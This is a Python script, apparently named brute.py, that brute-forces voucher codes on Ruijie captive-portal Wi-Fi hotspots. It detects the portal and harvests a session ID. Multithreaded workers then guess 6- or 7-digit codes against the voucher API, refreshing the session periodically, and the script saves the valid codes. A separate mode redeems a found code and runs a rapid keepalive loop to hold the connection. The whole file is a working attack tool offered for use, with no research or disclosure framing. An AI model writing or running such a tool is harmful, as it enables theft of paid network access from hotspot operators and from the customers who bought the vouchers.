#!/usr/bin/env python3
"""
Ruijie Voucher Finder v2
Finds valid codes WITHOUT consuming them. Saves results to file.
"""
import sys, threading, time, urllib.parse, queue, random, os, datetime
import requests, urllib3
urllib3.disable_warnings()

FOUND_CODES = []     # list of (code, logonUrl)
TRIED = 0
TOTAL = 0
LOCK = threading.Lock()
FOUND_LOCK = threading.Lock()
STOP = threading.Event()

def fmt_eta(rem, rate):
    if rate <= 0: return "?m"
    s = rem / rate
    h, r = divmod(int(s), 3600)
    m, s = divmod(r, 60)
    return f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"

def progress_printer(total, found_file):
    global TRIED
    last = 0
    while not STOP.is_set():
        time.sleep(5)
        with LOCK: tried = TRIED
        with FOUND_LOCK: nfound = len(FOUND_CODES)
        rate = (tried - last) / 5
        rem = total - tried
        eta = fmt_eta(rem, rate) if rate > 0 else "?m"
        status = f"  {tried}/{total} ({tried*100/total:.1f}%) | {rate:.0f}/s | ETA: {eta} | Found: {nfound}"
        if nfound and found_file:
            status += f" (saved to {found_file.name})"
        print(status)
        last = tried

def refresh_session(host, params):
    try:
        rs = requests.Session()
        r = rs.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
        ns = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
        rs.close()
        return ns
    except: return None

def worker(code_queue, sid_data, host, params, refresh_every, delay, consume):
    global TRIED
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    api_url = f"{host}/api/auth/voucher/?lang=en_US"
    local_count = 0

    while not STOP.is_set():
        try:
            code = code_queue.get_nowait()
        except queue.Empty:
            break

        with LOCK:
            sid = sid_data["sid"]

        try:
            r = sess.post(api_url, json={
                "accessCode": code, "sessionId": sid, "apiVersion": 1
            }, timeout=5)
            j = r.json()
            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                logon_url = j["result"]["logonUrl"]
                with FOUND_LOCK:
                    FOUND_CODES.append((code, logon_url))
                print(f"\n  >>> VALID: {code}")
                # Optionally consume (follow logonUrl)
                if consume:
                    try:
                        r2 = sess.get(logon_url, timeout=5, allow_redirects=False)
                        print(f"      Consumed -> {r2.status_code}")
                    except: pass
        except:
            pass

        with LOCK: TRIED += 1

        local_count += 1
        if local_count >= refresh_every:
            ns = refresh_session(host, params)
            if ns:
                with LOCK: sid_data["sid"] = ns
            local_count = 0

        if delay:
            time.sleep(delay / 1000)

    sess.close()

def main():
    global TOTAL
    import argparse
    parser = argparse.ArgumentParser(description="Ruijie Voucher Finder")
    parser.add_argument("--type", type=int, default=1, choices=[1, 2], help="1=6-digit, 2=7-digit")
    parser.add_argument("--start", type=int, help="Range start")
    parser.add_argument("--end", type=int, help="Range end")
    parser.add_argument("--threads", type=int, default=30, help="Worker threads")
    parser.add_argument("--delay", type=float, default=0, help="Delay per attempt (ms)")
    parser.add_argument("--wordlist", type=str, help="File with codes to try")
    parser.add_argument("--output", type=str, default="", help="Save valid codes to file")
    parser.add_argument("--refresh-every", type=int, default=500, help="Refresh session every N attempts")
    parser.add_argument("--consume", action="store_true", help="CONSUME found codes (use with caution)")
    parser.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility")
    parser.add_argument("--use", type=str, default=None, help="Use a specific code and go online")
    args = parser.parse_args()

    # ---- USE MODE: consume a single code ----
    if args.use:
        print(f"[Use] Code: {args.use}")
        sess = requests.Session()
        sess.verify = False
        sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
        r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=False)
        if r.status_code == 204:
            print("[!] Already online")
            return
        portal_url = r.headers.get("Location", "")
        if not portal_url:
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
            portal_url = r.url
        parsed = urllib.parse.urlparse(portal_url)
        params = parsed.query
        host = f"{parsed.scheme}://{parsed.netloc}"
        qp = urllib.parse.parse_qs(params)
        sid = qp.get("sessionId", [""])[0]
        if not sid:
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
        if not sid:
            print("[!] No sessionId")
            return
        gw_addr = qp.get("gw_address", ["192.168.10.1"])[0]
        gw_port = qp.get("gw_port", ["2060"])[0]
        print(f"Session: {sid[:16]}...  GW: {gw_addr}:{gw_port}")
        # Call API
        r = sess.post(f"{host}/api/auth/voucher/?lang=en_US", json={
            "accessCode": args.use, "sessionId": sid, "apiVersion": 1
        }, timeout=5)
        j = r.json()
        if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
            logon_url = j["result"]["logonUrl"]
            print(f"logonUrl: {logon_url}")
            r2 = sess.get(logon_url, timeout=5, allow_redirects=False)
            print(f"Gateway: {r2.status_code}")
            time.sleep(2)
            # Check online
            try:
                r3 = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
                if r3.status_code == 204:
                    print("*** ONLINE ***")
                    # Start keepalive
                    def ka():
                        while True:
                            sess.post(f"http://{gw_addr}:{gw_port}/wifidog/auth",
                                params={"token": sid, "phoneNumber": ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))},
                                headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
                                timeout=3)
                            time.sleep(0.1)
                    threading.Thread(target=ka, daemon=True).start()
                    print("Keepalive running. Ctrl+C to stop.")
                    try: while True: time.sleep(10)
                    except KeyboardInterrupt: print("\nDone")
            except: pass
        else:
            print(f"Failed: {j.get('message', '?')}")
        return

    # ---- FINDER MODE ----
    if args.wordlist:
        with open(args.wordlist) as f:
            codes_raw = [l.strip() for l in f if l.strip()]
        codes = codes_raw[:]
        print(f"Loaded {len(codes)} codes from {args.wordlist}")
    else:
        if args.type == 1:
            lo = args.start or 0
            hi = args.end or 999999
        else:
            lo = args.start or 0
            hi = args.end or 9999999
        z = len(str(hi))
        codes = [str(i).zfill(z) for i in range(lo, hi + 1)]
        print(f"Range: {str(lo).zfill(z)}-{str(hi).zfill(z)} ({len(codes)} codes)")

    TOTAL = len(codes)
    if args.seed is not None:
        random.seed(args.seed)
    random.shuffle(codes)

    code_queue = queue.Queue()
    for c in codes:
        code_queue.put(c)

    # Detect captive portal
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=False)
    if r.status_code == 204:
        print("[!] Already online - need captive portal")
        return
    portal_url = r.headers.get("Location", "")
    if not portal_url:
        r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
        portal_url = r.url
    parsed = urllib.parse.urlparse(portal_url)
    params = parsed.query
    host = f"{parsed.scheme}://{parsed.netloc}"
    qp = urllib.parse.parse_qs(params)

    sid = qp.get("sessionId", [""])[0]
    if not sid:
        r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
        sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
    if not sid:
        print("[!] No sessionId")
        return

    gw_addr = qp.get("gw_address", ["192.168.10.1"])[0]
    gw_port = qp.get("gw_port", ["2060"])[0]

    out_file = None
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_name = args.output or f"valid_codes_{timestamp}.txt"
    out_file = open(out_name, "w")
    print(f"Host: {host}  GW: {gw_addr}:{gw_port}")
    print(f"Session: {sid[:16]}...  Threads: {args.threads}")
    print(f"Output: {out_name}")
    print(f"Consume: {'YES' if args.consume else 'NO (just check)'}")
    print(f"Starting... (Ctrl+C to stop)\n")

    sid_data = {"sid": sid}

    stop_prog = threading.Event()
    prog_thread = threading.Thread(target=progress_printer, args=(TOTAL, out_file), daemon=True)
    prog_thread.start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(code_queue, sid_data, host, params, args.refresh_every, args.delay, args.consume), daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[Stopped]")
    finally:
        STOP.set()

    prog_thread.join(timeout=1)

    # Write found codes to file
    with FOUND_LOCK:
        found = FOUND_CODES[:]

    if out_file:
        for code, logon_url in found:
            out_file.write(f"{code}\n")
        out_file.close()
        print(f"\nSaved {len(found)} valid codes to {out_name}")

    if found:
        print(f"\n=== {len(found)} VALID CODES FOUND ===")
        for code, logon_url in found[:20]:
            print(f"  {code}")
        if len(found) > 20:
            print(f"  ... and {len(found)-20} more (see {out_name})")
        print(f"\nUse one: python brute.py --use CODE")
    else:
        print("\nNo valid codes found")

if __name__ == "__main__":
    main()
